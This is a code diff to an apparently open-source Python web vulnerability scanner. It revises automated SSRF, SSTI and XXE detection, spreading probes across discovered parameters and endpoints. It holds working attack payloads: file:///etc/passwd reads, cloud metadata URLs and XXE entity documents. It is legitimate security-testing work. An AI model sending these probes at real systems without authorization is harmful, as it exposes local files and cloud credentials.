@@ -132,7 +132,7 @@ BANNER = r"""
 """
 DESCRIPTION = "OWASP Web Security Testing Scanner"
 DEVELOPER = "developed by @afsh4ck"
-VERSION = "1.4.0"
+VERSION = "1.4.1"
 
 # ========== CONFIGURACIÓN ==========
 DEFAULT_TIMEOUT = 10
@@ -7927,49 +7927,157 @@ def _ssrf_payload_response_looks_internal(resp_text):
     body = (resp_text or "").lower()
     return any(m.lower() in body for m in markers)
 
-def test_ssrf(target, session, collaborator_url=None):
-    """SSRF: prueba parametros URL y cabeceras con hosts internos y metadatos cloud."""
-    results = []
-    print_info("Probando SSRF via parametros URL...")
-    # 1. Parametros GET con SSRF payloads.
-    base = target.rstrip("/")
-    for param in SSRF_URL_PARAMS:
-        for payload in SSRF_INTERNAL_TARGETS[:4]:  # limitar a mas criticos
-            test_url = f"{base}?{param}={payload}"
-            try:
-                resp = session.get(test_url, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
-                if resp.status_code == 200 and _ssrf_payload_response_looks_internal(resp.text):
-                    msg = f"SSRF confirmado: parametro '{param}' devuelve datos internos ({payload[:40]})"
-                    print_vuln(msg)
-                    results.append({"type": "ssrf", "param": param, "payload": payload,
-                                    "url": test_url, "status": resp.status_code})
-                    FINDINGS.append({"name": "SSRF", "detail": msg, "severity": "critical"})
-                elif resp.status_code == 200 and len(resp.text) > 50:
-                    # Respuesta inesperada (posible SSRF sin marcadores conocidos).
-                    if collaborator_url:
-                        oob_url = f"{base}?{param}={collaborator_url}"
-                        try:
-                            session.get(oob_url, timeout=DEFAULT_TIMEOUT)
-                            print_info(f"SSRF OOB enviado via '{param}' a {collaborator_url} — verifica el listener")
-                        except Exception:
-                            pass
-            except requests.RequestException:
-                pass
+# Sondas SSRF con oraculo determinista: cada payload provoca que el servidor
+# lea un recurso interno cuyo contenido reconocemos sin falsos positivos (a
+# diferencia de comparar tamanos/respuestas). file:// confirma lectura local.
+SSRF_PROBES = [
+    ("file:///etc/passwd",
+     ["root:x:0:0:", "daemon:x:", ":/bin/bash"]),
+    ("http://169.254.169.254/latest/meta-data/",
+     ["ami-id", "instance-id", "public-keys", "iam/", "local-hostname"]),
+    ("http://metadata.google.internal/computeMetadata/v1/",
+     ["computemetadata", "project/", "instance/"]),
+]
 
-    # 2. Cabeceras con IPs internas.
+
+def _collect_injection_points(target):
+    """Reune vectores de inyeccion descubiertos (spider + formularios + modulo
+    de inyeccion) y la lista de endpoints conocidos, para que las pruebas
+    avanzadas (SSRF/SSTI/XXE) ataquen los endpoints reales de la app y no solo
+    la raiz. Devuelve (get_points, post_points, endpoints)."""
+    get_points, post_points = [], []
+    endpoints, seen_pt = set(), set()
+
+    def _clean(url):
+        if not url:
+            return None
+        p = urlparse(url)
+        if not p.scheme:
+            url = urljoin(target, url)
+            p = urlparse(url)
+        return f"{p.scheme}://{p.netloc}{p.path}"
+
+    def _add_point(url, param, method):
+        clean = _clean(url)
+        if not clean or not param:
+            return
+        key = (clean, param, method)
+        if key in seen_pt:
+            return
+        seen_pt.add(key)
+        (post_points if method == "POST" else get_points).append((clean, param))
+
+    spider = SCAN_DATA.get("spider") or {}
+    for u in (spider.get("sample_urls") or []):
+        ep = _clean(u)
+        if ep:
+            endpoints.add(ep)
+        for k in parse_qs(urlparse(u).query):
+            _add_point(u, k, "GET")
+
+    forms = list(spider.get("sample_forms") or [])
+    forms += list((SCAN_DATA.get("injection") or {}).get("forms") or [])
+    for form in forms:
+        action = form.get("action") or form.get("url") or form.get("page_url") or target
+        method = (form.get("method") or "GET").upper()
+        ep = _clean(action)
+        if ep:
+            endpoints.add(ep)
+        for inp in (form.get("inputs") or []):
+            _add_point(action, inp, method)
+
+    for h in (SCAN_DATA.get("directory_hits") or []):
+        endpoints.add(_clean(h.get("url") if isinstance(h, dict) else h))
+    for e in (SCAN_DATA.get("api_endpoints") or []):
+        endpoints.add(_clean(e.get("url") if isinstance(e, dict) else e))
+    endpoints.discard(None)
+    endpoints.add(_clean(target))
+    return get_points, post_points, sorted(e for e in endpoints if e)
+
+
+def _send_probe(session, url, param, payload, method):
+    try:
+        if method == "POST":
+            return session.post(url, data={param: payload}, timeout=DEFAULT_TIMEOUT,
+                                allow_redirects=True)
+        return session.get(url, params={param: payload}, timeout=DEFAULT_TIMEOUT,
+                           allow_redirects=True)
+    except requests.RequestException:
+        return None
+
+
+def test_ssrf(target, session, collaborator_url=None):
+    """SSRF: ataca los parametros/endpoints descubiertos por el spider (no solo
+    la raiz) usando oraculos deterministas (file://, metadata cloud)."""
+    results = []
+    confirmed = set()
+    get_points, post_points, endpoints = _collect_injection_points(target)
+
+    # Vectores: parametros descubiertos (GET/POST) + nombres SSRF habituales
+    # contra cada endpoint conocido (para cubrir endpoints cuyo form no se
+    # capturo, p.ej. /ssrf?url=).
+    vectors, vseen = [], set()
+
+    def _add_vec(url, param, method):
+        key = (url, param, method)
+        if key not in vseen:
+            vseen.add(key)
+            vectors.append((url, param, method))
+
+    for url, param in get_points:
+        _add_vec(url, param, "GET")
+    for url, param in post_points:
+        _add_vec(url, param, "POST")
+    for ep in endpoints[:60]:
+        for param in SSRF_URL_PARAMS:
+            _add_vec(ep, param, "GET")
+
+    print_info(f"Probando SSRF en {len(vectors)} vectores (parametros + endpoints descubiertos)...")
+    for url, param, method in vectors:
+        if (url, param) in confirmed:
+            continue
+        # Para el fuzz de nombres comunes basta el oraculo file://; para puntos
+        # realmente descubiertos se prueban todas las sondas.
+        probes = SSRF_PROBES if (url, param) in {(u, p) for u, p in get_points + post_points} else SSRF_PROBES[:1]
+        for payload, markers in probes:
+            resp = _send_probe(session, url, param, payload, method)
+            if resp is None or resp.status_code >= 500:
+                continue
+            low = (resp.text or "").lower()
+            # Solo marcadores que NO formen parte del payload: si la app refleja
+            # el payload (p.ej. un endpoint SSTI/eco), 'computeMetadata' apareceria
+            # sin que exista SSRF. Exigir un marcador del CONTENIDO interno.
+            plow = payload.lower()
+            eff_markers = [m for m in markers if m.lower() not in plow]
+            if eff_markers and any(m.lower() in low for m in eff_markers):
+                confirmed.add((url, param))
+                msg = (f"SSRF confirmado: {method} {url} parametro '{param}' "
+                       f"lee recurso interno ({payload})")
+                print_vuln(msg)
+                results.append({"type": "ssrf", "param": param, "payload": payload,
+                                "url": url, "method": method, "status": resp.status_code})
+                FINDINGS.append({"name": "SSRF", "detail": msg, "severity": "critical"})
+                break
+            if collaborator_url:
+                _send_probe(session, url, param, collaborator_url, method)
+
+    # Cabeceras con IPs internas (oraculo determinista).
     print_info("Probando SSRF via cabeceras HTTP...")
     for header in SSRF_HEADERS:
-        for internal in ["127.0.0.1", "169.254.169.254", "metadata.google.internal"]:
+        for payload, markers in SSRF_PROBES[1:]:
             try:
-                resp = session.get(target, headers={header: internal}, timeout=DEFAULT_TIMEOUT)
-                if resp.status_code == 200 and _ssrf_payload_response_looks_internal(resp.text):
-                    msg = f"SSRF via cabecera '{header}: {internal}' devuelve datos internos"
-                    print_vuln(msg)
-                    results.append({"type": "ssrf-header", "header": header, "value": internal,
-                                    "status": resp.status_code})
-                    FINDINGS.append({"name": "SSRF (header)", "detail": msg, "severity": "critical"})
+                resp = session.get(target, headers={header: payload}, timeout=DEFAULT_TIMEOUT)
             except requests.RequestException:
-                pass
+                continue
+            low = (resp.text or "").lower()
+            plow = payload.lower()
+            eff_markers = [m for m in markers if m.lower() not in plow]
+            if eff_markers and any(m.lower() in low for m in eff_markers):
+                msg = f"SSRF via cabecera '{header}: {payload}' devuelve datos internos"
+                print_vuln(msg)
+                results.append({"type": "ssrf-header", "header": header, "value": payload,
+                                "status": resp.status_code})
+                FINDINGS.append({"name": "SSRF (header)", "detail": msg, "severity": "critical"})
 
     if not results:
         print_info("Sin indicios de SSRF en los vectores probados.")
@@ -7978,35 +8086,44 @@ def test_ssrf(target, session, collaborator_url=None):
 
 # ========== SSTI ==========
 
+# Operandos distintivos: el producto (1787569) no aparece por azar en una
+# pagina ni dentro del propio payload, asi que su presencia confirma que el
+# motor evaluo la expresion (no una simple reflexion del input).
 SSTI_PROBES = [
     # (payload, expected_in_response, engine_hint)
-    ("{{7*7}}", "49", "Jinja2/Twig/Nunjucks"),
-    ("${7*7}", "49", "FreeMarker/Thymeleaf EL"),
-    ("#{7*7}", "49", "Ruby/Pebble"),
-    ("<%= 7*7 %>", "49", "ERB/EJS"),
-    ("{{7*'7'}}", "7777777", "Twig"),
-    ("${{7*7}}", "49", "Pebble"),
-    ("%{{7*7}}", "49", "Tornado/Mako"),
-    ("[[7*7]]", "49", "Thymeleaf"),
+    ("{{1337*1337}}", "1787569", "Jinja2/Twig/Nunjucks"),
+    ("${1337*1337}", "1787569", "FreeMarker/Thymeleaf EL"),
+    ("#{1337*1337}", "1787569", "Ruby/Pebble"),
+    ("<%= 1337*1337 %>", "1787569", "ERB/EJS"),
+    ("${{1337*1337}}", "1787569", "Pebble"),
+    ("%{{1337*1337}}", "1787569", "Tornado/Mako"),
+    ("[[${1337*1337}]]", "1787569", "Thymeleaf"),
+    ("{{1337*'1'}}", "1337", "Twig/Jinja2 str"),
 ]
 
+# Solo firmas de error especificas de motor (clases de excepcion / tracebacks),
+# no palabras genericas como "jinja2" o "template" que aparecen en paginas
+# descriptivas sin que exista vulnerabilidad.
 SSTI_ERROR_MARKERS = [
-    "TemplateSyntaxError", "UndefinedError", "jinja2", "Twig_Error",
-    "FreeMarker", "template error", "Smarty", "velocity",
-    "thymeleaf", "pebble", "jade", "handlebars", "mustache",
+    "TemplateSyntaxError", "jinja2.exceptions", "UndefinedError",
+    "Twig_Error_Syntax", "freemarker.core.", "TemplateError",
+    "org.thymeleaf.exceptions", "smarty: syntax error",
 ]
 
-def test_ssti(url, param, session, method="GET"):
-    """SSTI detection via math probes. Devuelve True si confirma vulnerabilidad."""
-    for payload, expected, engine in SSTI_PROBES:
+def test_ssti(url, param, session, method="GET", probes=None):
+    """SSTI detection via math probes. Devuelve True si confirma vulnerabilidad.
+    'probes' permite limitar las sondas (fuzz ligero de nombres de parametro)."""
+    for payload, expected, engine in (probes or SSTI_PROBES):
         try:
             if method == "GET":
-                from urllib.parse import quote
-                resp = session.get(f"{url}?{param}={quote(payload)}", timeout=DEFAULT_TIMEOUT)
+                resp = session.get(url, params={param: payload}, timeout=DEFAULT_TIMEOUT)
             else:
                 resp = session.post(url, data={param: payload}, timeout=DEFAULT_TIMEOUT)
             body = resp.text or ""
-            if expected in body:
+            # El resultado distintivo (p.ej. 1787569) solo aparece si el motor
+            # evaluo la expresion; no esta en el payload ni suele estar en la
+            # pagina, asi que confirma la ejecucion (no una mera reflexion).
+            if expected in body and expected not in payload:
                 msg = f"SSTI confirmado ({engine}) en parametro '{param}' — payload '{payload}' -> '{expected}' en respuesta"
                 print_vuln(msg)
                 FINDINGS.append({"name": "SSTI", "detail": msg, "severity": "critical",
@@ -8025,76 +8142,127 @@ def test_ssti(url, param, session, method="GET"):
 
 # ========== XXE ==========
 
-XXE_PAYLOADS = [
-    (
-        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>',
-        ["root:x:", "daemon:", "/bin/bash"],
-    ),
-    (
-        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root><data>&xxe;</data></root>',
-        None,  # cualquier respuesta distinta al XML normal puede ser positiva
-    ),
-    (
-        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://169.254.169.254/">%dtd;]><root/>',
-        ["ami-id", "instance-id", "local-hostname"],
-    ),
-]
-
 XXE_CONTENT_TYPES = [
     "application/xml",
     "text/xml",
     "application/soap+xml",
 ]
 
-def _find_xml_endpoints(target, session, found_endpoints):
-    """Devuelve URLs que aceptan XML (por Content-Type o extension)."""
-    candidates = list(found_endpoints or [])
-    for suffix in ["/xmlrpc.php", "/soap", "/api/xml", "/ws", "/service.asmx", "/api/v1/xml"]:
-        candidates.append(urljoin(target, suffix))
-    xml_endpoints = []
-    for url in candidates[:20]:
-        for ct in XXE_CONTENT_TYPES:
-            try:
-                resp = session.post(url, data="<test/>", headers={"Content-Type": ct},
-                                    timeout=DEFAULT_TIMEOUT)
-                # Si no devuelve 404/405/415 es candidato.
-                if resp.status_code not in (404, 405, 415):
-                    xml_endpoints.append((url, ct))
-                    break
-            except requests.RequestException:
-                pass
-    return xml_endpoints
+# Nombres de campo habituales donde inyectar la entidad. Muchos backends solo
+# reflejan campos concretos (name, message, ...), por lo que un payload
+# <root><data> generico no muestra el contenido; se inyecta en varios a la vez.
+XXE_FIELD_NAMES = [
+    "name", "data", "value", "message", "text", "comment",
+    "title", "content", "email", "subject", "input", "xml", "body",
+]
+
+
+def _build_xxe_payloads(field_names=None):
+    """Genera payloads XXE inyectando la entidad en multiples campos para
+    maximizar la reflexion. Devuelve [(payload, markers|None), ...]."""
+    fields = list(dict.fromkeys((field_names or []) + XXE_FIELD_NAMES))
+    inner = "".join(f"<{f}>&xxe;</{f}>" for f in fields if re.match(r"^[A-Za-z_][\w.-]*$", f))
+    if not inner:
+        inner = "<data>&xxe;</data>"
+
+    def _doc(entity_decl):
+        return (f'<?xml version="1.0"?><!DOCTYPE foo [{entity_decl}]>'
+                f'<root>{inner}</root>')
+
+    return [
+        (_doc('<!ENTITY xxe SYSTEM "file:///etc/passwd">'),
+         ["root:x:0:0:", "daemon:x:", ":/bin/bash"]),
+        (_doc('<!ENTITY xxe SYSTEM "file:///etc/hostname">'), None),
+        (_doc('<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">'),
+         ["ami-id", "instance-id", "local-hostname", "public-keys"]),
+    ]
+
+
+def _xml_endpoint_candidates(target, found_endpoints):
+    """Construye endpoints candidatos para XXE a partir de spider, formularios,
+    directorios y endpoints conocidos, derivando sufijos API/XML y normalizando
+    prefijos tipo /lab/<x> -> /<x> y /<x>/api (donde suele vivir el parser XML)."""
+    cand = set()
+
+    def _add(u):
+        if not u:
+            return
+        u = u.split("?")[0]
+        if not urlparse(u).scheme:
+            u = urljoin(target, u)
+        cand.add(u)
+
+    for e in (found_endpoints or []):
+        _add(e.get("url") if isinstance(e, dict) else e)
+    spider = SCAN_DATA.get("spider") or {}
+    for u in (spider.get("sample_urls") or []):
+        _add(u)
+    for f in (spider.get("sample_forms") or []):
+        _add(f.get("action") or f.get("url") or f.get("page_url"))
+    for h in (SCAN_DATA.get("directory_hits") or []):
+        _add(h.get("url") if isinstance(h, dict) else h)
+
+    derived = set()
+    for u in list(cand):
+        p = urlparse(u)
+        path = p.path.rstrip("/")
+        roots = {path}
+        m = re.match(r"^/lab(/[^/]+.*)$", path)   # /lab/xxe -> /xxe
+        if m:
+            roots.add(m.group(1))
+        for r in roots:
+            base = f"{p.scheme}://{p.netloc}{r}"
+            derived.add(base)
+            for suf in ("/api", "/xml", "/import", "/parse", "/upload", "/ws", "/soap"):
+                derived.add(base + suf)
+    cand |= derived
+    for suffix in ("/xmlrpc.php", "/soap", "/api/xml", "/ws", "/service.asmx", "/api/v1/xml"):
+        cand.add(urljoin(target, suffix))
+    return sorted(c for c in cand if c)
+
 
 def test_xxe(target, session, found_endpoints=None):
-    """XXE: inyeccion en endpoints que aceptan XML."""
+    """XXE: descubre endpoints que aceptan XML (incluidos los derivados como
+    /xxe/api) y prueba lectura de ficheros locales con oraculo determinista."""
     results = []
-    xml_eps = _find_xml_endpoints(target, session, found_endpoints or [])
-    if not xml_eps:
-        print_info("Sin endpoints XML detectados para probar XXE.")
-        return results
-    print_info(f"Probando XXE en {len(xml_eps)} endpoint(s) XML...")
-    for endpoint_url, content_type in xml_eps:
-        for payload, markers in XXE_PAYLOADS:
-            try:
-                resp = session.post(endpoint_url, data=payload,
-                                    headers={"Content-Type": content_type},
-                                    timeout=DEFAULT_TIMEOUT)
+    # Nombres de campo descubiertos en formularios, para inyectar donde se reflejen.
+    form_fields = []
+    for f in ((SCAN_DATA.get("spider") or {}).get("sample_forms") or []):
+        form_fields.extend(f.get("inputs") or [])
+    payloads = _build_xxe_payloads(form_fields)
+
+    candidates = _xml_endpoint_candidates(target, found_endpoints)[:80]
+    print_info(f"Probando XXE en {len(candidates)} endpoint(s) candidatos (XML)...")
+    hit_eps = set()
+    for endpoint_url in candidates:
+        # Sondeo rapido: ¿acepta POST con cuerpo XML?
+        try:
+            probe = session.post(endpoint_url, data="<x/>",
+                                 headers={"Content-Type": "application/xml"},
+                                 timeout=DEFAULT_TIMEOUT)
+        except requests.RequestException:
+            continue
+        if probe.status_code in (404, 405, 415, 501):
+            continue
+        for content_type in XXE_CONTENT_TYPES:
+            if endpoint_url in hit_eps:
+                break
+            for payload, markers in payloads:
+                try:
+                    resp = session.post(endpoint_url, data=payload,
+                                        headers={"Content-Type": content_type},
+                                        timeout=DEFAULT_TIMEOUT)
+                except requests.RequestException:
+                    continue
                 body = resp.text or ""
-                if markers:
-                    if any(m in body for m in markers):
-                        msg = f"XXE confirmado en {endpoint_url} (Content-Type: {content_type})"
-                        print_vuln(msg)
-                        results.append({"url": endpoint_url, "content_type": content_type,
-                                        "payload": payload[:80]})
-                        FINDINGS.append({"name": "XXE", "detail": msg, "severity": "critical"})
-                        break
-                elif len(body) > 10 and body.strip() not in ("<root/>", "", "<root></root>"):
-                    msg = f"XXE posible en {endpoint_url} — respuesta inesperada con entidad externa"
-                    print_warning(msg)
+                if markers and any(m in body for m in markers):
+                    msg = f"XXE confirmado en {endpoint_url} (Content-Type: {content_type}) — lectura de fichero local"
+                    print_vuln(msg)
                     results.append({"url": endpoint_url, "content_type": content_type,
-                                    "payload": payload[:80], "note": "respuesta inesperada"})
-            except requests.RequestException:
-                pass
+                                    "payload": payload[:80]})
+                    FINDINGS.append({"name": "XXE", "detail": msg, "severity": "critical"})
+                    hit_eps.add(endpoint_url)
+                    break
     if not results:
         print_info("Sin indicios de XXE en los endpoints probados.")
     return results
@@ -8589,25 +8757,34 @@ def run_advanced_security_tests(target, session):
     print_info("[1/6] SSRF...")
     adv["ssrf"] = safe_execute(test_ssrf, target, session, collab) or []
 
-    print_info("[2/6] SSTI en parametros URL del objetivo...")
+    print_info("[2/6] SSTI en parametros y formularios descubiertos...")
     ssti_hits = []
-    # Extraer params GET del spider/info si existen.
-    spider_urls = list((SCAN_DATA.get("spider") or {}).get("urls_found", []) or [])[:30]
-    tested_params = set()
-    for test_url in [target] + spider_urls:
-        parsed = urlparse(test_url)
-        params = list(parse_qs(parsed.query).keys())
-        for param in params:
-            key = (parsed.scheme + "://" + parsed.netloc + parsed.path, param)
-            if key not in tested_params:
-                tested_params.add(key)
-                clean_url = parsed.scheme + "://" + parsed.netloc + parsed.path
-                if test_ssti(clean_url, param, session, "GET"):
-                    ssti_hits.append({"url": clean_url, "param": param})
+    ssti_seen = set()
+    get_points, post_points, ssti_endpoints = _collect_injection_points(target)
+    # Nombres de parametro habituales para plantillas (fuzz ligero, 2 sondas).
+    SSTI_PARAM_NAMES = ["template", "tpl", "render", "preview", "name", "q",
+                        "search", "message", "input", "content", "page", "view"]
+    light_probes = SSTI_PROBES[:2]
+
+    def _try_ssti(url, param, method, probes=None):
+        key = (url, param, method)
+        if key in ssti_seen:
+            return
+        ssti_seen.add(key)
+        if test_ssti(url, param, session, method, probes=probes):
+            ssti_hits.append({"url": url, "param": param})
+
+    for url, param in get_points:
+        _try_ssti(url, param, "GET")
+    for url, param in post_points:
+        _try_ssti(url, param, "POST")
+    for ep in ssti_endpoints[:30]:
+        for param in SSTI_PARAM_NAMES:
+            _try_ssti(ep, param, "GET", probes=light_probes)
     adv["ssti"] = ssti_hits
 
     print_info("[3/6] XXE...")
-    found_endpoints = SCAN_DATA.get("api_endpoints") or []
+    found_endpoints = (SCAN_DATA.get("api_endpoints") or []) + ssti_endpoints
     adv["xxe"] = safe_execute(test_xxe, target, session, found_endpoints) or []
 
     print_info("[4/6] CRLF Injection...")
